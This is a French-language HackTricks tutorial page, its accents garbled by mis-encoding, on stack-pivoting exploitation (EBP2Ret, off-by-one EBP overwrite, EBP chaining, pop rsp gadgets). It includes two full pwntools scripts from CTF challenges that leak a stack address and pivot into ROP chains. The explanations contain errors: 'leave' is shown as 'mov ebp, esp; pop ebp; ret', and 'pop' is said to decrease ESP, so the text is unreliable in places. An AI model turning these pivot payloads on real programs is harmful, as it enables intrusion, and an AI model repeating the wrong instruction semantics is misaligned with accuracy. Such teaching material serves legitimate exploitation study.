# Stack Pivoting - EBP2Ret - EBP chaining

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

Cette technique exploite la capacit√© de manipuler le **Base Pointer (EBP)** pour encha√Æner l'ex√©cution de plusieurs fonctions en utilisant soigneusement le registre EBP et la s√©quence d'instructions **`leave; ret`**.

Pour rappel, **`leave`** signifie essentiellement:
```
mov       ebp, esp
pop       ebp
ret
```
Et comme l'**EBP est dans la pile** avant l'EIP, il est possible de le contr√¥ler en contr√¥lant la pile.

### EBP2Ret

Cette technique est particuli√®rement utile lorsque vous pouvez **modifier le registre EBP mais n'avez pas de moyen direct de changer le registre EIP**. Elle exploite le comportement des fonctions lorsqu'elles ont fini d'ex√©cuter.

Si, pendant l'ex√©cution de `fvuln`, vous parvenez √† injecter un **faux EBP** dans la pile qui pointe vers une zone en m√©moire o√π se trouve l'adresse de votre shellcode (plus 4 octets pour tenir compte de l'op√©ration `pop`), vous pouvez contr√¥ler indirectement l'EIP. Lorsque `fvuln` retourne, l'ESP est d√©fini sur cet emplacement fabriqu√©, et l'op√©ration `pop` suivante diminue l'ESP de 4, **le faisant effectivement pointer vers une adresse stock√©e par l'attaquant l√†-dedans.**\
Notez comment vous **devez conna√Ætre 2 adresses** : Celle o√π l'ESP va aller, o√π vous devrez √©crire l'adresse point√©e par ESP.

#### Construction de l'exploit

Tout d'abord, vous devez conna√Ætre une **adresse o√π vous pouvez √©crire des donn√©es / adresses arbitraires**. L'ESP pointera ici et **ex√©cutera le premier `ret`**.

Ensuite, vous devez conna√Ætre l'adresse utilis√©e par `ret` qui **ex√©cutera du code arbitraire**. Vous pourriez utiliser :

* Une adresse **ONE\_GADGET** valide.
* L'adresse de **`system()`** suivie de **4 octets de remplissage** et l'adresse de `"/bin/sh"` (bits x86).
* L'adresse d'un gadget **`jump esp;`** (ret2esp) suivi du **shellcode** √† ex√©cuter.
* Une cha√Æne **ROP**.

Rappelez-vous qu'avant l'une de ces adresses dans la partie contr√¥l√©e de la m√©moire, il doit y avoir **`4` octets** en raison de la partie **`pop`** de l'instruction `leave`. Il serait possible d'abuser de ces 4B pour d√©finir un **deuxi√®me faux EBP** et continuer √† contr√¥ler l'ex√©cution.

#### Exploitation Off-By-One

Il existe une variante sp√©cifique de cette technique appel√©e "Exploitation Off-By-One". Elle est utilis√©e lorsque vous ne pouvez **modifier que le byte de poids faible de l'EBP**. Dans ce cas, l'emplacement m√©moire stockant l'adresse vers laquelle sauter avec le **`ret`** doit partager les trois premiers octets avec l'EBP, permettant une manipulation similaire avec des conditions plus contraignantes.\
G√©n√©ralement, le byte 0x00 est modifi√© pour sauter le plus loin possible.

De plus, il est courant d'utiliser un toboggan RET dans la pile et de placer la v√©ritable cha√Æne ROP √† la fin pour qu'il soit plus probable que le nouvel ESP pointe √† l'int√©rieur du toboggan RET et que la cha√Æne ROP finale soit ex√©cut√©e.

### **Chaining EBP**

Ainsi, en pla√ßant une adresse contr√¥l√©e dans l'entr√©e `EBP` de la pile et une adresse √† `leave; ret` dans `EIP`, il est possible de **d√©placer l'`ESP` vers l'adresse `EBP` contr√¥l√©e de la pile**.

Maintenant, l'**`ESP`** est contr√¥l√© pointant vers une adresse souhait√©e et l'instruction suivante √† ex√©cuter est un `RET`. Pour abuser de cela, il est possible de placer √† l'emplacement ESP contr√¥l√© ceci :

* **`&(prochain faux EBP)`** -> Charge le nouveau EBP en raison de `pop ebp` de l'instruction `leave`
* **`system()`** -> Appel√© par `ret`
* **`&(leave;ret)`** -> Appel√© apr√®s la fin de system, il d√©placera ESP vers le faux EBP et recommencera
* **`&("/bin/sh")`**-> Param√®tre pour `system`

De cette mani√®re, il est possible de cha√Æner plusieurs faux EBPs pour contr√¥ler le flux du programme.

C'est comme un [ret2lib](../rop-return-oriented-programing/ret2lib/), mais plus complexe sans b√©n√©fice apparent mais pourrait √™tre int√©ressant dans certains cas particuliers.

De plus, voici un [**exemple de d√©fi**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) qui utilise cette technique avec une **fuite de pile** pour appeler une fonction gagnante. Voici la charge finale de la page :
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP might not be used

Comme [**expliqu√© dans ce post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), si un binaire est compil√© avec certaines optimisations, l'**EBP ne parvient jamais √† contr√¥ler ESP**, donc, toute exploitation fonctionnant en contr√¥lant EBP √©chouera essentiellement car elle n'a aucun effet r√©el.\
Cela est d√ª aux **changements dans le prologue et l'√©pilogue** si le binaire est optimis√©.

* **Non optimis√© :**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimis√© :**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## Autres fa√ßons de contr√¥ler RSP

### **Gadget `pop rsp`**

[**Sur cette page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp), vous pouvez trouver un exemple utilisant cette technique. Pour ce d√©fi, il √©tait n√©cessaire d'appeler une fonction avec 2 arguments sp√©cifiques, et il y avait un **gadget `pop rsp`** et il y a une **fuite de la pile**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### Gadget xchg \<reg>, rsp
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

V√©rifiez la technique ret2esp ici:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## R√©f√©rences et Autres Exemples

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bits, exploitation off by one avec une cha√Æne rop commen√ßant par un ret sled
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bits, pas de relro, canary, nx et pie. Le programme accorde une fuite pour la pile ou le pie et un WWW d'un qword. Obtenez d'abord la fuite de la pile et utilisez le WWW pour revenir et obtenir la fuite de pie. Ensuite, utilisez le WWW pour cr√©er une boucle √©ternelle en abusant des entr√©es `.fini_array` + appel de `__libc_csu_fini` ([plus d'infos ici](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). En abusant de cet √©criture "√©ternelle", une cha√Æne ROP est √©crite dans le .bss et finit par l'appeler en pivotant avec RBP.

## ARM64

En ARM64, les **prologues et √©pilogues** des fonctions **ne stockent pas et ne r√©cup√®rent pas le registre SP** dans la pile. Par cons√©quent, par d√©faut, vous **ne pourrez pas contr√¥ler le registre SP** en √©crivant des donn√©es dans la pile.



<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
